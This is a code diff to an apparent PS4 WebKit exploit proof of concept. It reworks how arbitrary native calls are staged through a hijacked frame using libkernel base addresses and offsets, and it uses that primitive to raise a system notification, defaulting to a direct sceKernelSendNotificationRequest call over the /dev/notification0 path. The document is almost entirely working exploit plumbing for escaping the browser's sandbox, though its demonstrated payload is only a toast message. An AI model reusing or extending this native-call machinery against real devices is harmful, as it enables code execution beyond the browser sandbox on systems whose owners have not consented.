@@ -439,8 +439,8 @@ const DEFAULT_NOTIFY_MSG = "PS4 WebKit PoC";
 const DEFAULT_NOTIFY_ICON = "cxml://psnotification/tex_icon_system";
 
 /**
- * PS4 WebKit notify struct — Y2JB / remote_lua_loader / OSM (NOT slopkit).
- * open("/dev/notification0") + write(0xc30) is what WebKit exploits use for toast.
+ * PS4 notify struct — BDJ notify.lua / mast1c0re / OSM-PS4-Notify (NOT slopkit/PS5).
+ * WebKit browser: direct sceKernelSendNotificationRequest @ lk+k_notify.
  */
 function writeNotifyOsm(u8, dv, message, iconUri) {
     message = message || DEFAULT_NOTIFY_MSG;
@@ -473,16 +473,27 @@ function writeNotifyPlain(u8, dv, message) {
 function resolveNotifyFormat(opts) {
     const q = (opts && opts.format) || (typeof location !== "undefined"
         ? new URLSearchParams(location.search).get("notifyfmt") : null);
-    if (q === "plain") return "plain";
-    if (q === "direct") return "direct";
-    return "osm";
+    if (q === "osm") return "osm";
+    if (q === "plain" || q === "bdj" || q === "mast") return "plain";
+    return "plain";
 }
 
 function resolveNotifyPath(opts) {
     const q = (opts && opts.notifyPath) || (typeof location !== "undefined"
         ? new URLSearchParams(location.search).get("notifypath") : null);
-    if (q === "direct" || q === "knotify") return "direct";
-    return "dev";
+    if (q === "dev") return "dev";
+    return "direct";
+}
+
+/** Return value captured at slab frame F — prefer native read over DataView. */
+function readCallRet(p, prep) {
+    let ret = prep.M.frameDv.getUint32(0, true) | 0;
+    try {
+        const mem = p.read4(prep.M.F);
+        if (mem != null)
+            ret = (mem | 0);
+    } catch (_) { }
+    return ret;
 }
 
 function writeNotifyStructAb(ab, message, iconUri, fmt) {
@@ -609,7 +620,7 @@ function logNotifyStruct(p, buf, message, fmt, opts) {
         + (peek === (message || DEFAULT_NOTIFY_MSG).slice(0, 48) ? "" : " MISMATCH"));
 }
 
-/** Direct k_notify @ lk+0x19320 — errno=0 but may not toast in WebKit; use dev path default. */
+/** Direct k_notify @ lk+0x19320 — PS4 WebKit path (errno 0 = success). */
 export function stageNotify(p, prep, libkernelBase, off, opts) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("stageNotify: no prep");
@@ -631,8 +642,8 @@ export function stageNotify(p, prep, libkernelBase, off, opts) {
 }
 
 /**
- * PS4 WebKit toast path — Y2JB / remote_lua_loader:
- * open("/dev/notification0", O_WRONLY) → write(fd, buf, 0xc30) → close(fd)
+ * Dev-node toast — post-breakout only (game/Lua with syscall.open).
+ * WebKit browser sandbox typically blocks /dev/notification0 (fd<=2, wr=0).
  */
 export function fireNotifyDevWrite(p, prep, libkernelBase, off, opts) {
     if (!prep || !prep.M || !prep.G)
@@ -664,6 +675,10 @@ export function fireNotifyDevWrite(p, prep, libkernelBase, off, opts) {
     prep.staged = true;
     prep.stagedKind = "notify-open";
     const fd = fireNativeCall(p, prep, off, fireOpts);
+    if (opts.log) opts.log("NOTIFY-DEV", "open ret=" + fd);
+    if (fd <= 2)
+        throw new Error("notify open failed fd=" + fd
+            + " — WebKit likely blocks /dev/notification0; use ?notifypath=direct");
     if (fd < 0)
         throw new Error("notify open /dev/notification0 fd=" + fd);
     if (opts.log) opts.log("NOTIFY-DEV", "fd=" + fd + " write " + NOTIFY_REQ_SIZE);
@@ -674,16 +689,16 @@ export function fireNotifyDevWrite(p, prep, libkernelBase, off, opts) {
     prep.staged = true;
     prep.stagedKind = "notify-write";
     const wr = fireNativeCall(p, prep, off, fireOpts);
-    if (wr < 0)
-        throw new Error("notify write ret=" + wr);
+    if (wr !== NOTIFY_REQ_SIZE)
+        throw new Error("notify write ret=" + wr + " want=" + NOTIFY_REQ_SIZE);
 
     prep._layout = layoutNativeCall(
         prep.M, prep.G, libkernelBase.add32(closeOff), [new int64(fd >>> 0, 0)]);
     prep.staged = true;
     prep.stagedKind = "notify-close";
     const cl = fireNativeCall(p, prep, off, fireOpts);
-    if (opts.log) opts.log("NOTIFY-DEV-OK", "wr=" + wr + " close=" + cl);
-    return { fd, wr, close: cl, ok: true, errno: 0 };
+    if (opts.log) opts.log("NOTIFY-DEV-OK", "fd=" + fd + " wr=" + wr + " close=" + cl);
+    return { fd, wr, close: cl, ok: wr === NOTIFY_REQ_SIZE && fd > 2, errno: 0 };
 }
 
 export function fireNotify(p, prep, libkernelBase, off, opts) {
@@ -1388,7 +1403,7 @@ export function fireNativeCall(p, prep, off, opts) {
     prep.mainArmed = false;
     prep.staged = false;
     prep._bisect = {};
-    return prep.M.frameDv.getUint32(0, true) | 0;
+    return readCallRet(p, prep);
 }
 
 export function fireUsleep(p, prep, libkernelBase, off, usec) {
